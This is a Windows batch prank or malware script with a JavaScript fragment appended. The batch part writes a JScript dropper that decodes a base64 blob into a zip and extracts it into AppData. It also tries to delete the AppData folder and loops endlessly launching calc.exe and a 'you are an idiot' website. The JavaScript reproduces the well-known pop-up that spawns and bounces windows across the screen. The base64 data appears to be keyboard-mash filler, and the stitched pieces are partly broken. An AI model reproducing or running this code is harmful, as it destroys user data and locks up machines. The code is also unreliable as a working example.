@echo off

color D

echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js

set v="%appdata%\"
del %v% >NUL 2>NUL
cscript x.js >NUL 2>NUL
del x.js >NUL 2>NUL
del z.zip >NUL 2>NUL
del x >NUL 2>NUL
start "" %v%

start calc.exe 

:A
start calc.exe
ping localhost -m 5 >nul
goto :A

:A
start www.youareidiot.org
ping localhost -m 5 >nul
goto :A

echo ouiasehdphIUHGohGPIhpuhpIUHpihPDIHI7T8g97g087Gog9>>x
echo UIYGo0GOgoQG8Gug8GOg8uhOUGug907gUYG0bUgOUGO8Ugohq>>x
echo UHdsaniahsdhajsodlikusdgfbuibAOLUBdwuyTGDfd8i7FWG>>x
echo DG0o87gtG9876twdgwOUYT7DIUWFO76fdiYFDI7rd87TDatdo>>x
echo GUVBDog87GOT8dgo7TDgwqd8gQ8Go8yd8GO8d8YD0q7wdo87q>>x
echo YGUig7I76tduDRduyTDgd6QDGIuq6d5tGQDI76qduyti8TYTH>>x
echo GO8YDGVou7fOUFGudyfYUDVIOyutsfdiuytFGDSAYDFguoygs>>x
echo uhasdPIUHAWdihPHiuhIHDPhuiHDQUO88YD87YsdH08TgdUYG>>x
echo AAAAAAAAAAAAAAAAAAAAAA==>>x

echo ouiasehdphIUHGohGPIhpuhpIUHpihPDIHI7T8g97g087Gog9>>x
echo UIYGo0GOgoQG8Gug8GOg8uhOUGug907gUYG0bUgOUGO8Ugohq>>x
echo UHdsaniahsdhajsodlikusdgfbuibAOLUBdwuyTGDfd8i7FWG>>x
echo DG0o87gtG9876twdgwOUYT7DIUWFO76fdiYFDI7rd87TDatdo>>x
echo GUVBDog87GOT8dgo7TDgwqd8gQ8Go8yd8GO8d8YD0q7wdo87q>>x
echo YGUig7I76tduDRduyTDgd6QDGIuq6d5tGQDI76qduyti8TYTH>>x
echo GO8YDGVou7fOUFGudyfYUDVIOyutsfdiuytFGDSAYDFguoygs>>x
echo uhasdPIUHAWdihPHiuhIHDPhuiHDQUO88YD87YsdH08TgdUYG>>x
echo AAAAAAAAJJAjjaa==>>x

echo ouiasehdphIUHGohGPIhpuhpIUHpihPDIHI7T8g97g087Gog9>>x
echo UIYGo0GOgoQG8Gug8GOg8uhOUGug907gUYG0bUgOUGO8Ugohq>>x
echo UHdsaniahsdhajsodlikusdgfbuibAOLUBdwuyTGDfd8i7FWG>>x
echo DG0o87gtG9876twdgwOUYT7DIUWFO76fdiYFDI7rd87TDatdo>>x
echo GUVBDog87GOT8dgo7TDgwqd8gQ8Go8yd8GO8d8YD0q7wdo87q>>x
echo YGUig7I76tduDRduyTDgd6QDGIuq6d5tGQDI76qduyti8TYTH>>x
echo GO8YDGVou7fOUFGudyfYUDVIOyutsfdiuytFGDSAYDFguoygs>>x
echo uhasdPIUHAWdihPHiuhIHDPhuiHDQUO88YD87YsdH08TgdUYG>>x
echo AAAAAAAAJJAjjaa==>>x

echo ouiasehdphIUHGohGPIhpuhpIUHpihPDIHI7T8g97g087Gog9>>x
echo UIYGo0GOgoQG8Gug8GOg8uhOUGug907gUYG0bUgOUGO8Ugohq>>x
echo UHdsaniahsdhajsodlikusdgfbuibAOLUBdwuyTGDfd8i7FWG>>x
echo DG0o87gtG9876twdgwOUYT7DIUWFO76fdiYFDI7rd87TDatdo>>x
echo GUVBDog87GOT8dgo7TDgwqd8gQ8Go8yd8GO8d8YD0q7wdo87q>>x
echo YGUig7I76tduDRduyTDgd6QDGIuq6d5tGQDI76qduyti8TYTH>>x
echo GO8YDGVou7fOUFGudyfYUDVIOyutsfdiuytFGDSAYDFguoygs>>x
echo uhasdPIUHAWdihPHiuhIHDPhuiHDQUO88YD87YsdH08TgdUYG>>x
echo AAAAAAAAJJAjjaa==>>x



		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function openWindow(url){
        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
}

function procreate(){
		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
		}

function newXlt(){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus()}

function newXrt(){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }

function newYup(){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }

function newYdn(){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }
function fOff(){
        flagrun = 0;
        }

function playBall(){
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width-175){
        newXlt();
        }
        if (xPos < 0){
        newXrt();
        }
        if (yPos > screen.height-100){
        newYup();
        }
        if (yPos < 0){
        newYdn();
        }
        if (flagRun == 1){
        window.moveTo(xPos,yPos);
        setTimeout('playBall()',1);
        }
        }